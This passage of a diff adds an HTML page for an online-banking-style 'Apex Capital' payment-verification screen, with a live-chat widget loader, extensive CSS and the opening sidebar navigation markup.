@@ -1,0 +1,1348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apex Capital — Payment Verification</title>
+  <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '2780ffa99def9b45b2a63a3953129467e665769d';
+window.smartsupp||(function(d) {
+	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+	c.type='text/javascript';c.charset='utf-8';c.async=true;
+	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --deep: #021024; --navy: #052659; --slate: #5483B3;
+      --sky: #7DA0CA; --ice: #C1E8FF; --mist: #E0F2FE; --white: #FFFFFF;
+      --sidebar-width: 260px;
+    }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      background: var(--deep); color: #fff; overflow-x: hidden; line-height: 1.6;
+    }
+
+    /* Auth gate */
+    .auth-gate {
+      position: fixed; inset: 0; z-index: 99999;
+      background: linear-gradient(160deg, var(--deep) 0%, var(--navy) 50%, #0a3a7a 100%);
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      transition: opacity 0.8s ease, visibility 0.8s;
+    }
+    .auth-gate.done { opacity: 0; visibility: hidden; pointer-events: none; }
+    .auth-gate p { margin-top: 24px; color: var(--sky); font-size: 14px; letter-spacing: 1px; text-transform: uppercase; }
+
+    .app { display: flex; min-height: 100vh; }
+
+    /* Sidebar */
+    .sidebar {
+      width: var(--sidebar-width);
+      background: linear-gradient(180deg, rgba(5,38,89,0.6), rgba(2,16,36,0.9));
+      border-right: 1px solid rgba(193,232,255,0.08);
+      backdrop-filter: blur(20px);
+      position: fixed; inset: 0 auto 0 0;
+      z-index: 200;
+      display: flex; flex-direction: column;
+      padding: 24px 20px;
+      transition: transform 0.4s cubic-bezier(0.4,0,0.2,1);
+    }
+    .sidebar-overlay {
+      position: fixed; inset: 0; background: rgba(2,16,36,0.6);
+      backdrop-filter: blur(4px); z-index: 199;
+      display: none; opacity: 0; transition: opacity 0.3s;
+    }
+    .sidebar-overlay.show { display: block; opacity: 1; }
+    .sidebar-brand {
+      display: flex; align-items: center; gap: 12px;
+      font-size: 20px; font-weight: 600; letter-spacing: -0.3px;
+      text-decoration: none; color: #fff; margin-bottom: 48px;
+      padding: 0 8px;
+    }
+    .sidebar-brand span { color: var(--ice); }
+    .sidebar-brand span b { color: #fff; }
+    .logo-orbital {
+      width: 40px; height: 40px;
+      position: relative; transform-style: preserve-3d; perspective: 200px; flex-shrink: 0;
+    }
+    .logo-ring {
+      position: absolute; top: 50%; left: 50%; border-radius: 50%; transform-style: preserve-3d;
+    }
+    .logo-ring-outer {
+      width: 36px; height: 36px; margin: -18px 0 0 -18px;
+      border: 2.5px solid transparent; border-top-color: var(--sky); border-right-color: var(--ice); border-left-color: var(--slate);
+      animation: spinLogo1 4s linear infinite; transform: rotateX(55deg) rotateY(15deg);
+      filter: drop-shadow(0 0 10px rgba(125,160,202,0.7));
+    }
+    .logo-ring-mid {
+      width: 26px; height: 26px; margin: -13px 0 0 -13px;
+      border: 2px solid transparent; border-top-color: var(--ice); border-bottom-color: var(--sky);
+      animation: spinLogo2 3s linear infinite reverse; transform: rotateX(-40deg) rotateY(25deg);
+      filter: drop-shadow(0 0 8px rgba(193,232,255,0.5));
+    }
+    .logo-ring-inner {
+      width: 18px; height: 18px; margin: -9px 0 0 -9px;
+      border: 1.5px solid transparent; border-right-color: var(--slate); border-bottom-color: var(--ice);
+      animation: spinLogo3 2.5s linear infinite; transform: rotateX(25deg) rotateY(-20deg);
+      filter: drop-shadow(0 0 6px rgba(84,131,179,0.6));
+    }
+    .logo-core {
+      position: absolute; top: 50%; left: 50%;
+      width: 6px; height: 6px; margin: -3px 0 0 -3px; border-radius: 50%;
+      background: radial-gradient(circle, var(--ice) 0%, var(--sky) 70%);
+      box-shadow: 0 0 16px rgba(193,232,255,0.7), 0 0 32px rgba(125,160,202,0.3);
+      animation: pulseLogo 2s ease-in-out infinite;
+    }
+    @keyframes spinLogo1 { 0% { transform: rotateX(55deg) rotateY(15deg) rotateZ(0deg); } 100% { transform: rotateX(55deg) rotateY(15deg) rotateZ(360deg); } }
+    @keyframes spinLogo2 { 0% { transform: rotateX(-40deg) rotateY(25deg) rotateZ(0deg); } 100% { transform: rotateX(-40deg) rotateY(25deg) rotateZ(360deg); } }
+    @keyframes spinLogo3 { 0% { transform: rotateX(25deg) rotateY(-20deg) rotateZ(0deg); } 100% { transform: rotateX(25deg) rotateY(-20deg) rotateZ(360deg); } }
+    @keyframes pulseLogo { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.25); opacity: 0.85; } }
+
+    .nav-section { margin-bottom: 32px; }
+    .nav-section-title {
+      font-size: 11px; font-weight: 600; color: var(--slate);
+      text-transform: uppercase; letter-spacing: 1.5px;
+      padding: 0 12px; margin-bottom: 12px;
+    }
+    .nav-item {
+      display: flex; align-items: center; gap: 14px;
+      padding: 12px 14px; border-radius: 12px;
+      color: var(--sky); text-decoration: none; font-size: 14px; font-weight: 500;
+      transition: all 0.25s ease; cursor: pointer; border: none; background: none; width: 100%; font-family: inherit;
+    }
+    .nav-item:hover, .nav-item.active {
+      background: linear-gradient(135deg, rgba(193,232,255,0.1), rgba(84,131,179,0.08));
+      color: var(--ice); border: 1px solid rgba(193,232,255,0.12);
+    }
+    .nav-item.active {
+      background: linear-gradient(135deg, rgba(193,232,255,0.14), rgba(84,131,179,0.1));
+      color: #fff; border-color: rgba(193,232,255,0.2);
+      box-shadow: 0 4px 20px rgba(84,131,179,0.15);
+    }
+    .nav-item svg { width: 20px; height: 20px; flex-shrink: 0; stroke-width: 2; }
+    .sidebar-footer { margin-top: auto; padding-top: 24px; border-top: 1px solid rgba(193,232,255,0.06); }
+    .user-pill {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px; border-radius: 14px;
+      background: linear-gradient(160deg, rgba(193,232,255,0.06), rgba(84,131,179,0.04));
+      border: 1px solid rgba(193,232,255,0.08);
+    }
+    .user-avatar {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: linear-gradient(135deg, var(--slate), var(--sky));
+      display: grid; place-items: center; font-size: 14px; font-weight: 600; color: var(--deep);
+    }
+    .user-info { text-align: left; }
+    .user-name { font-size: 13px; font-weight: 600; color: #fff; }
+    .user-role { font-size: 12px; color: var(--slate); }
+
+    .main { flex: 1; margin-left: var(--sidebar-width); min-height: 100vh; position: relative; }
+
+    /* Topbar */
+    .topbar {
+      position: sticky; top: 0; z-index: 100;
+      background: rgba(2,16,36,0.8); backdrop-filter: blur(20px);
+      border-bottom: 1px solid rgba(193,232,255,0.06);
+      padding: 16px 32px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .topbar-left { display: flex; align-items: center; gap: 16px; }
+    .topbar-brand {
+      display: flex; align-items: center; gap: 10px;
+      text-decoration: none; transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+    .topbar-brand .logo-orbital { width: 28px; height: 28px; }
+    .topbar-brand .logo-ring-outer { width: 24px; height: 24px; margin: -12px 0 0 -12px; border-width: 2px; }
+    .topbar-brand .logo-ring-mid { width: 18px; height: 18px; margin: -9px 0 0 -9px; border-width: 1.5px; }
+    .topbar-brand .logo-ring-inner { width: 12px; height: 12px; margin: -6px 0 0 -6px; border-width: 1px; }
+    .topbar-brand .logo-core { width: 4px; height: 4px; margin: -2px 0 0 -2px; }
+    .topbar-brand-text { font-size: 16px; font-weight: 600; letter-spacing: -0.3px; color: #fff; }
+    .topbar-brand-text span { color: var(--ice); }
+    .topbar-brand-text span b { color: #fff; }
+    .search-box { position: relative; width: 320px; }
+    .search-box input {
+      width: 100%; padding: 10px 16px 10px 40px;
+      background: rgba(193,232,255,0.05);
+      border: 1px solid rgba(193,232,255,0.1);
+      border-radius: 12px; color: #fff; font-size: 14px; font-family: inherit;
+      outline: none; transition: all 0.25s;
+    }
+    .search-box input:focus {
+      border-color: var(--sky); background: rgba(193,232,255,0.08);
+      box-shadow: 0 0 0 3px rgba(125,160,202,0.1);
+    }
+    .search-box input::placeholder { color: var(--slate); }
+    .search-box svg {
+      position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+      width: 16px; height: 16px; color: var(--slate);
+    }
+    .topbar-actions { display: flex; align-items: center; gap: 16px; }
+    .icon-btn {
+      width: 40px; height: 40px; border-radius: 12px;
+      background: rgba(193,232,255,0.05); border: 1px solid rgba(193,232,255,0.1);
+      display: grid; place-items: center; color: var(--sky);
+      cursor: pointer; transition: all 0.25s; position: relative;
+    }
+    .icon-btn:hover {
+      background: rgba(193,232,255,0.1); border-color: rgba(193,232,255,0.2);
+      color: var(--ice); transform: translateY(-1px);
+    }
+    .icon-btn svg { width: 18px; height: 18px; }
+    .badge {
+      position: absolute; top: -2px; right: -2px;
+      min-width: 18px; height: 18px; border-radius: 50%;
+      background: linear-gradient(135deg, var(--slate), var(--sky));
+      color: var(--deep); font-size: 10px; font-weight: 700;
+      display: grid; place-items: center;
+      box-shadow: 0 2px 8px rgba(84,131,179,0.4);
+      padding: 0 5px;
+    }
+    .mobile-toggle { display: none; background: none; border: none; color: var(--ice); cursor: pointer; }
+
+    /* Notification Dropdown */
+    .notif-dropdown {
+      position: absolute; top: 52px; right: -12px;
+      width: 360px; max-height: 460px;
+      background: linear-gradient(160deg, rgba(5,38,89,0.98), rgba(2,16,36,0.99));
+      border: 1px solid rgba(193,232,255,0.12);
+      border-radius: 20px;
+      backdrop-filter: blur(24px);
+      box-shadow: 0 24px 60px rgba(2,16,36,0.6);
+      opacity: 0; transform: translateY(10px) scale(0.96);
+      pointer-events: none; transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      z-index: 300; overflow: hidden;
+    }
+    .notif-dropdown.show {
+      opacity: 1; transform: translateY(0) scale(1);
+      pointer-events: auto;
+    }
+    .notif-header {
+      padding: 20px 24px 12px;
+      display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid rgba(193,232,255,0.06);
+    }
+    .notif-header h4 { font-size: 15px; font-weight: 600; }
+    .notif-header span { font-size: 12px; color: var(--slate); cursor: pointer; transition: color 0.2s; }
+    .notif-header span:hover { color: var(--ice); }
+    .notif-list { max-height: 360px; overflow-y: auto; padding: 8px; }
+    .notif-list::-webkit-scrollbar { width: 4px; }
+    .notif-list::-webkit-scrollbar-thumb { background: rgba(193,232,255,0.15); border-radius: 4px; }
+    .notif-item {
+      display: flex; align-items: flex-start; gap: 12px;
+      padding: 14px; border-radius: 14px;
+      transition: all 0.2s; cursor: pointer;
+    }
+    .notif-item:hover { background: rgba(193,232,255,0.06); }
+    .notif-item.unread { background: rgba(125,160,202,0.07); border: 1px solid rgba(193,232,255,0.06); }
+    .notif-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--slate); margin-top: 6px; flex-shrink: 0;
+    }
+    .notif-item.unread .notif-dot { background: var(--ice); box-shadow: 0 0 8px rgba(193,232,255,0.6); }
+    .notif-body { flex: 1; min-width: 0; }
+    .notif-title { font-size: 13px; font-weight: 600; color: #fff; line-height: 1.4; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .notif-preview { font-size: 12px; color: var(--slate); line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .notif-time { font-size: 11px; color: var(--slate); margin-top: 6px; }
+    .notif-empty {
+      text-align: center; padding: 40px 20px; color: var(--slate); font-size: 13px;
+    }
+
+    /* Notification Detail Modal */
+    .notif-modal {
+      position: fixed; inset: 0; z-index: 500;
+      display: none; align-items: center; justify-content: center;
+      background: rgba(2,16,36,0.85); backdrop-filter: blur(12px);
+      opacity: 0; transition: opacity 0.3s ease;
+    }
+    .notif-modal.show { display: flex; opacity: 1; }
+    .notif-modal-card {
+      width: 90%; max-width: 480px;
+      padding: 32px;
+      background: linear-gradient(160deg, rgba(193,232,255,0.1), rgba(84,131,179,0.05));
+      border: 1px solid rgba(193,232,255,0.15);
+      border-radius: 24px;
+      box-shadow: 0 30px 80px rgba(2,16,36,0.6);
+      transform: scale(0.95); transition: transform 0.3s ease;
+    }
+    .notif-modal.show .notif-modal-card { transform: scale(1); }
+    .notif-modal-header {
+      display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;
+    }
+    .notif-modal-header h3 { font-size: 18px; font-weight: 600; }
+    .notif-modal-close {
+      width: 32px; height: 32px; border-radius: 8px;
+      background: rgba(193,232,255,0.06); border: 1px solid rgba(193,232,255,0.1);
+      color: var(--sky); display: grid; place-items: center; cursor: pointer; transition: all 0.2s;
+    }
+    .notif-modal-close:hover { background: rgba(193,232,255,0.12); color: var(--ice); }
+    .notif-modal-body { font-size: 15px; color: var(--sky); line-height: 1.7; margin-bottom: 20px; }
+    .notif-modal-meta { font-size: 12px; color: var(--slate); margin-bottom: 24px; }
+    .notif-modal-btn {
+      width: 100%; padding: 14px;
+      background: linear-gradient(135deg, var(--slate), var(--sky));
+      color: var(--deep); border: none; border-radius: 12px;
+      font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit;
+      transition: all 0.25s;
+    }
+    .notif-modal-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(84,131,179,0.4); }
+
+    /* Payment Verify Page */
+    .pay-page {
+      padding: 32px;
+      max-width: 620px;
+      margin: 0 auto;
+      animation: slideUp 0.8s cubic-bezier(0.4,0,0.2,1) forwards;
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(40px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .pay-header { margin-bottom: 28px; text-align: center; }
+    .pay-header h1 {
+      font-size: 32px; font-weight: 600; letter-spacing: -0.5px; margin-bottom: 6px;
+      background: linear-gradient(135deg, #fff 20%, var(--sky) 60%, var(--ice) 100%);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+    }
+    .pay-header p { color: var(--sky); font-size: 15px; }
+
+    .billing-card {
+      padding: 32px; border-radius: 24px;
+      background: linear-gradient(160deg, rgba(193,232,255,0.1), rgba(84,131,179,0.06));
+      border: 1px solid rgba(193,232,255,0.15);
+      backdrop-filter: blur(12px);
+      text-align: center;
+      margin-bottom: 24px;
+      position: relative; overflow: hidden;
+      animation: slideUp 0.8s cubic-bezier(0.4,0,0.2,1) 0.1s forwards;
+      opacity: 0;
+    }
+    .billing-card::before {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+      background: linear-gradient(90deg, var(--slate), var(--sky), var(--ice));
+      background-size: 200% 100%;
+      animation: shimmerLine 4s linear infinite;
+    }
+    @keyframes shimmerLine {
+      0% { background-position: -200% 0; }
+      100% { background-position: 200% 0; }
+    }
+    .billing-label {
+      font-size: 12px; color: var(--sky); text-transform: uppercase; letter-spacing: 1.5px;
+      margin-bottom: 12px;
+    }
+    .billing-amount {
+      font-size: 48px; font-weight: 700; letter-spacing: -2px;
+      background: linear-gradient(135deg, #fff, var(--ice));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+      line-height: 1.1;
+    }
+    .billing-desc {
+      font-size: 13px; color: var(--slate); margin-top: 12px;
+    }
+
+    .code-panel {
+      padding: 28px; border-radius: 24px;
+      background: linear-gradient(160deg, rgba(193,232,255,0.06), rgba(84,131,179,0.03));
+      border: 1px solid rgba(193,232,255,0.1);
+      backdrop-filter: blur(12px);
+      animation: slideUp 0.8s cubic-bezier(0.4,0,0.2,1) 0.2s forwards;
+      opacity: 0;
+    }
+    .code-info {
+      text-align: center; margin-bottom: 24px;
+    }
+    .code-info h3 {
+      font-size: 18px; font-weight: 600; margin-bottom: 10px;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .code-info h3 svg { width: 20px; height: 20px; color: var(--sky); }
+    .code-info p {
+      font-size: 14px; color: var(--sky); line-height: 1.7;
+    }
+    .code-info .highlight {
+      color: var(--ice); font-weight: 600;
+    }
+    .code-input-wrap {
+      margin-bottom: 20px;
+    }
+    .code-input-wrap label {
+      display: block; font-size: 12px; font-weight: 500; color: var(--sky);
+      margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;
+    }
+    .code-input {
+      width: 100%; padding: 16px 20px;
+      background: rgba(193,232,255,0.05);
+      border: 1px solid rgba(193,232,255,0.1);
+      border-radius: 16px; color: #fff; font-size: 18px; font-family: inherit;
+      outline: none; transition: all 0.25s; text-align: center; letter-spacing: 4px;
+      font-weight: 600;
+    }
+    .code-input:focus {
+      border-color: var(--sky); background: rgba(193,232,255,0.08);
+      box-shadow: 0 0 0 4px rgba(125,160,202,0.1);
+    }
+    .code-input::placeholder { color: var(--slate); letter-spacing: 2px; font-weight: 400; }
+    .verify-btn {
+      width: 100%; padding: 16px;
+      background: linear-gradient(135deg, var(--slate), var(--sky));
+      color: var(--deep); border: none; border-radius: 16px;
+      font-size: 15px; font-weight: 600; cursor: pointer; font-family: inherit;
+      transition: all 0.3s ease;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .verify-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 16px 48px rgba(84,131,179,0.4);
+    }
+    .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none; }
+
+    .pay-status {
+      text-align: center; padding: 16px; border-radius: 14px;
+      margin-top: 16px; font-size: 14px; font-weight: 500;
+      display: none;
+    }
+    .pay-status.show { display: block; }
+    .pay-status.success {
+      background: rgba(46,204,113,0.1); border: 1px solid rgba(46,204,113,0.2); color: #2ecc71;
+    }
+    .pay-status.error {
+      background: rgba(231,76,60,0.1); border: 1px solid rgba(231,76,60,0.2); color: #e74c3c;
+    }
+
+    /* Timer Display */
+    .timer-display {
+      text-align: center; padding: 20px; border-radius: 16px;
+      background: linear-gradient(160deg, rgba(193,232,255,0.08), rgba(84,131,179,0.04));
+      border: 1px solid rgba(193,232,255,0.12);
+      margin-bottom: 20px;
+      display: none;
+    }
+    .timer-display.show { display: block; }
+    .timer-label {
+      font-size: 12px; color: var(--sky); text-transform: uppercase; letter-spacing: 1.5px;
+      margin-bottom: 8px;
+    }
+    .timer-value {
+      font-size: 36px; font-weight: 700; letter-spacing: 2px;
+      background: linear-gradient(135deg, var(--ice), var(--sky));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+      font-variant-numeric: tabular-nums;
+    }
+    .timer-desc {
+      font-size: 13px; color: var(--slate); margin-top: 8px;
+    }
+    .timer-animation {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .timer-spinner {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: 3px solid rgba(193,232,255,0.1);
+      border-top-color: var(--sky);
+      animation: spinLoader 1s linear infinite;
+    }
+
+    /* Stage explanation card */
+    .stage-explain {
+      padding: 20px; border-radius: 16px;
+      background: linear-gradient(135deg, rgba(193,232,255,0.05), rgba(84,131,179,0.03));
+      border: 1px solid rgba(193,232,255,0.08);
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .stage-explain h4 {
+      font-size: 14px; font-weight: 600; color: var(--ice);
+      margin-bottom: 6px; display: flex; align-items: center; gap: 8px;
+    }
+    .stage-explain h4 svg { width: 16px; height: 16px; }
+    .stage-explain p {
+      font-size: 13px; color: var(--sky); line-height: 1.6;
+    }
+
+    /* Particles */
+    .particles { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+    .particle {
+      position: absolute; width: 4px; height: 4px; background: var(--sky);
+      border-radius: 50%; opacity: 0.3; animation: floatParticle linear infinite;
+    }
+    @keyframes floatParticle {
+      0% { transform: translateY(100vh) scale(0); opacity: 0; }
+      10% { opacity: 0.3; } 90% { opacity: 0.3; }
+      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+    }
+
+    /* NAVBAR LOADER */
+    .nav-loader {
+      display: none; align-items: center; gap: 10px;
+      position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
+    }
+    .nav-loader.show { display: flex; }
+    .nav-loader .logo-orbital { width: 28px; height: 28px; }
+    .nav-loader .logo-ring-outer { width: 24px; height: 24px; margin: -12px 0 0 -12px; border-width: 2px; }
+    .nav-loader .logo-ring-mid { width: 18px; height: 18px; margin: -9px 0 0 -9px; border-width: 1.5px; }
+    .nav-loader .logo-ring-inner { width: 12px; height: 12px; margin: -6px 0 0 -6px; border-width: 1px; }
+    .nav-loader .logo-core { width: 4px; height: 4px; margin: -2px 0 0 -2px; }
+    .nav-loader span { font-size: 12px; color: var(--sky); letter-spacing: 1px; text-transform: uppercase; }
+
+    /* Process overlay */
+    .process-overlay {
+      position: fixed; inset: 0; z-index: 9999;
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+      background: rgba(2, 16, 36, 0.92); backdrop-filter: blur(12px);
+    }
+    .process-overlay.show { display: flex; }
+    .process-scene { width: 140px; height: 140px; perspective: 600px; margin-bottom: 32px; display: flex; align-items: center; justify-content: center; }
+    .process-orbital { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; animation: tiltScene 8s ease-in-out infinite; }
+    .process-ring { position: absolute; top: 50%; left: 50%; border-radius: 50%; transform-style: preserve-3d; }
+    .process-ring-outer { width: 120px; height: 120px; margin: -60px 0 0 -60px; border: 2.5px solid transparent; border-top-color: var(--sky); border-right-color: var(--ice); border-left-color: var(--slate); animation: spinLogo1 3s linear infinite; transform: rotateX(60deg) rotateY(20deg); filter: drop-shadow(0 0 12px rgba(125,160,202,0.6)); }
+    .process-ring-mid { width: 90px; height: 90px; margin: -45px 0 0 -45px; border: 2px solid transparent; border-top-color: var(--ice); border-bottom-color: var(--sky); animation: spinLogo2 2.5s linear infinite reverse; transform: rotateX(-45deg) rotateY(35deg); filter: drop-shadow(0 0 10px rgba(193,232,255,0.5)); }
+    .process-ring-inner { width: 60px; height: 60px; margin: -30px 0 0 -30px; border: 1.5px solid transparent; border-right-color: var(--slate); border-bottom-color: var(--ice); animation: spinLogo3 2s linear infinite; transform: rotateX(30deg) rotateY(-25deg); filter: drop-shadow(0 0 8px rgba(84,131,179,0.6)); }
+    .process-core { position: absolute; top: 50%; left: 50%; width: 18px; height: 18px; margin: -9px 0 0 -9px; border-radius: 50%; background: radial-gradient(circle, var(--ice), var(--sky)); box-shadow: 0 0 30px rgba(193,232,255,0.7), 0 0 60px rgba(125,160,202,0.3); animation: pulseCore 2s ease-in-out infinite; }
+    .process-core::after { content: ''; position: absolute; top: 50%; left: 50%; width: 6px; height: 6px; margin: -3px 0 0 -3px; border-radius: 50%; background: #fff; box-shadow: 0 0 16px rgba(255,255,255,0.9); }
+    @keyframes pulseCore { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.15); opacity: 0.85; } }
+    @keyframes tiltScene { 0%, 100% { transform: rotateX(-10deg) rotateY(0deg); } 25% { transform: rotateX(5deg) rotateY(15deg); } 50% { transform: rotateX(-5deg) rotateY(-10deg); } 75% { transform: rotateX(10deg) rotateY(5deg); } }
+    .process-label { font-size: 15px; color: var(--sky); letter-spacing: 2px; text-transform: uppercase; }
+
+    /* Toast */
+    .toast { position: fixed; bottom: 38px; left: 50%; transform: translateX(-50%) translateY(180px); background: linear-gradient(135deg, var(--slate), var(--sky)); color: var(--deep); padding: 14px 28px; border-radius: 12px; font-size: 14px; font-weight: 600; box-shadow: 0 12px 40px rgba(84,131,179,0.4); z-index: 10000; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); pointer-events: none; }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+
+    /* Billing Loader */
+    .billing-loader {
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      gap: 12px; padding: 20px;
+    }
+    .billing-loader-spinner {
+      width: 32px; height: 32px; border-radius: 50%;
+      border: 2.5px solid rgba(193,232,255,0.1);
+      border-top-color: var(--sky);
+      animation: spinLoader 0.8s linear infinite;
+    }
+    @keyframes spinLoader { to { transform: rotate(360deg); } }
+    .billing-loader-text {
+      font-size: 13px; color: var(--sky); letter-spacing: 0.5px;
+    }
+    .billing-content { animation: fadeIn 0.4s ease; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .billing-error {
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      gap: 10px; padding: 20px;
+    }
+    .billing-error-icon {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: rgba(231,76,60,0.15); color: #e74c3c;
+      display: grid; place-items: center; font-size: 18px; font-weight: 700;
+    }
+    .billing-error-text {
+      font-size: 13px; color: var(--sky); text-align: center;
+    }
+    .billing-retry-btn {
+      padding: 8px 20px; border-radius: 10px;
+      background: linear-gradient(135deg, var(--slate), var(--sky));
+      color: var(--deep); border: none; font-size: 13px; font-weight: 600;
+      cursor: pointer; font-family: inherit; transition: all 0.25s;
+    }
+    .billing-retry-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(84,131,179,0.3); }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .sidebar { transform: translateX(-100%); }
+      .sidebar.open { transform: translateX(0); }
+      .main { margin-left: 0; }
+      .mobile-toggle { display: block; }
+      .topbar { padding: 16px 20px; }
+      .pay-page { padding: 20px; }
+      .billing-amount { font-size: 36px; }
+      .timer-value { font-size: 28px; }
+      .search-box { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Floating Particles -->
+  <div class="particles" id="particles"></div>
+
+  <!-- Auth Gate -->
+  <div class="auth-gate" id="authGate">
+    <div class="process-scene">
+      <div class="process-orbital">
+        <div class="process-ring process-ring-outer"></div>
+        <div class="process-ring process-ring-mid"></div>
+        <div class="process-ring process-ring-inner"></div>
+        <div class="process-core"></div>
+      </div>
+    </div>
+    <p>Verifying session...</p>
+  </div>
+
+  <div class="app">
+    <!-- Sidebar -->
+    <aside class="sidebar" id="sidebar">
+      <a href="dashboard.html" class="sidebar-brand">
+        <div class="logo-orbital">
+          <div class="logo-ring logo-ring-outer"></div>
+          <div class="logo-ring logo-ring-mid"></div>
+          <div class="logo-ring logo-ring-inner"></div>
+          <div class="logo-core"></div>
+        </div>
+        <span>Apex <b>Capital</b></span>
+      </a>
+
+      <div class="nav-section">
+        <div class="nav-section-title">Menu</div>
+        <a href="dashboard.html" class="nav-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+          Dashboard
+        </a>
+        <a href="transfer.html" class="nav-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>
+          Transfer
+        </a>
+        <a href="transaction.html" class="nav-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+          Transaction
+        </a>
+        <!-- <button class="nav-item" onclick="showToast('Card page coming soon')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+          Card
+        </button>
+        <button class="nav-item" onclick="showToast('Analytics page coming soon')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>
+          Analytics
+        </button> -->
+        <a href="setting.html" class="nav-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.6 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.6a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
